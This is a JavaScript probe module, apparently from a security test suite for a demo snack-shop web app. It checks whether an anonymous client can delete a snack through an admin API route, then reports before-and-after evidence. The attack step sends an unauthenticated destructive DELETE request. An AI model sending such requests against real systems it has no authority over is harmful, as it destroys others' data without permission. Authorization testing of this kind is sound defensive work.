import { get, del } from '../lib/client.mjs'

export default {
  id: 'A3',
  title: 'A stranger with no session deletes a snack through the admin API',
  topic: 'Authorization — a destructive route with no authn and no authz',
  kind: 'http',

  async attack() {
    const before = await get('/api/snacks')
    // Take the least-popular snack so the rest of the run still has data.
    const target = before.json?.at(-1)
    if (!target) {
      return { worked: false, evidence: 'no snacks to delete — probe inconclusive' }
    }

    const res = await del(`/api/admin/snacks/${target.id}`) // no session at all
    const after = await get('/api/snacks')
    const gone = !after.json?.some((s) => s.id === target.id)

    return {
      worked: gone,
      evidence: gone
        ? `anonymous DELETE /api/admin/snacks/${target.id} returned ${res.status} and "${target.name}" is gone`
        : `anonymous DELETE /api/admin/snacks/${target.id} returned ${res.status} and the snack is still there`,
    }
  },
}
